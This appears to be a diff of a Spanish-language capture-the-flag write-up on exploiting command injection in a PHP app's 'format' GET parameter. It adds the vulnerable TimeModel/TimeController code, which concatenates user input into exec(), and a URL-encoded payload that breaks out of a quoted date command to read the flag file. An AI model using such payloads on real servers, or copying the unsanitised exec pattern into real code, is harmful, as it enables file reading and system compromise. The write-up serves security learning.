@@ -4,13 +4,47 @@ Este desafío consistió en explotar una vulnerabilidad de inyección de comando
 🧠 Detalles de la Explotación
 💻 URL Vulnerable
 bash
-http://94.237.53.203:55075/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
+/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
 # Traducción: date '; cd .. ; pwd; cat flag'
 🛠️ Análisis Técnico
 🔧 Comando Base:
 
-La app usaba date con parámetro de formato ⏳
+Si revisábamos el archivo /challenge/models/TimeModel.php podiamos obervar que:
+```
+Model.php
+<?php
+class TimeModel
+{
+    public function __construct($format)
+    {
+        $this->command = "date '+" . $format . "' 2>&1";
+    }
 
+    public function getTime()
+    {
+        $time = exec($this->command);
+        $res  = isset($time) ? $time : '?';
+        return $res;
+    }
+}
+```
+La app usaba date con parámetro de formato (que al revisar controllers/TimeController.php) se notaba que el formato se introducía en la URL como resultado de un GET
+```
+<?php
+class TimeController
+{
+    public function index($router)
+    {
+        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
+        $time = new TimeModel($format);
+        return $router->view('index', ['time' => $time->getTime()]);
+    }
+}
+```
+Notábamos que se ejecutaba (de lo pasado por GET) en $time un exec que puede ejecutar comandos a nivel de sistema, con lo cual atacamos de la forma antes explicada
+```
+/?format=date%20%27+;%20cd%20..%20;%20pwd;%20cat%20flag%27
+```
 Uso normal: ?format=Y-m-d → date "Y-m-d"
 
 🔗 Codificación URL:
@@ -19,8 +53,13 @@ Uso normal: ?format=Y-m-d → date "Y-m-d"
 
 %27 = Comilla simple (')
 
-%3B = Punto y coma (;) [no usado aquí pero común]
+%3B = Punto y coma (;) [no usado aquí pero común] para separar comandos
 
+Si hacíamos un 
+```
+pwd
+```
+nos encontrábamos en /www, con lo cual había que redirigirse a /flag para encontrar la flag
 💣 Payload Malicioso:
 
 bash
@@ -39,7 +78,7 @@ La aplicación vulnerable tenía este flujo:
 php
 <?php
 $format = $_GET['format'];
-system("date '$format'");  # ¡Peligro! Input sin sanitizar
+exec("date '$format'");  # ¡Peligro! Input sin sanitizar
 ?>
 🛡️ Medidas de Prevención
 Tácticas de Seguridad	Ejemplos
